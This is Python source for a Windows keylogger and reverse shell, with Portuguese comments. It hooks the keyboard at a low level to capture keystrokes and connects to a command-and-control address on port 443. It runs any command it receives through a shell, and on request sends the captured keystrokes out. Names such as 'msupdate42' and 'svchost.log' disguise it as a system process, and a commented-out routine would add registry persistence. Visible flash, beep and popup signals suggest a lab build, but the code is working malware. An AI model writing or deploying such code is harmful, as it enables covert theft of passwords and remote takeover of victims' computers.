from time import sleep, strftime
import subprocess, socket, os, threading, sys, ctypes, ctypes.wintypes, winreg, shutil
from ctypes import windll

# ---------- CONFIG ----------
IP, PORT   = "192.168.56.101", 443
LOG_FILE   = os.path.join(os.getenv("APPDATA"), "svchost.log")
MUTEX      = "Global\\msupdate42"          # evita 2x execução
BUF, LOCK  = "", threading.Lock()

# ---------- SINAL VISÍVEL ----------
def flash_desktop():
    """Inverte 3x as cores da área de trabalho em 300 ms"""
    hdc = windll.user32.GetDC(0)
    for _ in range(3):
        windll.gdi32.PatBlt(hdc, 0, 0, 1920, 1080, 0x500325)  # DSTINVERT
        sleep(0.1)
    windll.user32.ReleaseDC(0, hdc)

def popup_ok():
    """Caixinha discreta que auto-fecha em 2 s"""
    windll.user32.MessageBoxW(0, "Check-in realizado", "", 0x40 | 0x1000)  # MB_OK | MB_TOPMOST

def beep_ok():
    """Beeps rápidos 3x (1 kHz, 80 ms)"""
    for _ in range(3):
        windll.kernel32.Beep(1000, 80)
        sleep(0.05)

# ---------- KEYLOGGER ----------
WH_KEYBOARD_LL = 13
WM_KEYDOWN, WM_SYSKEYDOWN = 0x0100, 0x0104

HOOKPROCTYPE = ctypes.WINFUNCTYPE(ctypes.c_uint, ctypes.c_uint, ctypes.c_uint, ctypes.c_void_p)
hook_id = None

def low_level_handler(nCode, wParam, lParam):
    if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        vk = lParam[0] & 0xFF
        char = ""
        mapped = windll.user32.MapVirtualKeyA(vk, 2)
        if 32 <= mapped <= 126:
            char = chr(mapped)
            shift = windll.user32.GetKeyState(0x10) & 0x8000
            caps  = windll.user32.GetKeyState(0x14) & 1
            if shift ^ caps and char.isalpha():
                char = char.upper()
        elif vk == 13: char = "\n"
        elif vk == 9:  char = "\t"
        elif vk == 8:  char = "[BS]"
        if char:
            with LOCK:
                globals()["BUF"] += char
    return windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

hook_func = HOOKPROCTYPE(low_level_handler)

def start_keylogger():
    global hook_id
    hook_id = windll.user32.SetWindowsHookExA(WH_KEYBOARD_LL, hook_func,
                                              windll.kernel32.GetModuleHandleA(None), 0)
    msg = ctypes.wintypes.MSG()
    while windll.user32.GetMessageA(ctypes.byref(msg), 0, 0, 0) != 0:
        pass

# ---------- PERSISTÊNCIA ----------
#def persist():
 #   dst = os.path.join(os.getenv("APPDATA"), "msupdate.exe")
  #  if not os.path.exists(dst):
   #     shutil.copy2(sys.executable, dst)
    #    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
     #                          r"Software\Microsoft\Windows\CurrentVersion\Run")
      #  winreg.SetValueEx(key, "msupdate", 0, winreg.REG_SZ, dst)
       # winreg.CloseKey(key)

# ---------- C&C ----------
def connect(ip, port):
    try:
        s = socket.socket()
        s.connect((ip, port))
        return s
    except:
        return None

def listen(s):
    while True:
        data = s.recv(1024).decode().strip()
        if data == "/exit":
            break
        if data == "/keys":
            with LOCK:
                global BUF
                chunk, BUF = BUF[-4096:], ""
            s.send(chunk.encode() + b"\n")
            continue
        if data.startswith("cd "):
            os.chdir(data[3:])
            s.send(b"OK\n")
            continue
        p = subprocess.Popen(data, shell=True,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)
        out, err = p.communicate()
        s.send(out + err + b"\n")

# ---------- MAIN ----------
def main():
    # singleton
    mutex = windll.kernel32.CreateMutexA(None, 1, MUTEX)
    if windll.kernel32.GetLastError() == 0xB7:  # ERROR_ALREADY_EXISTS
        sys.exit()
    # persistencia
    ################persist()
    threading.Thread(target=start_keylogger, daemon=1).start()

    # sinal de vida
    threading.Thread(target=flash_desktop, daemon=1).start()
    threading.Thread(target=beep_ok, daemon=1).start()
    popup_ok()

    while True:
        s = connect(IP, PORT)
        if s:
            listen(s)
        sleep(0.5)

if __name__ == "__main__":
    main()
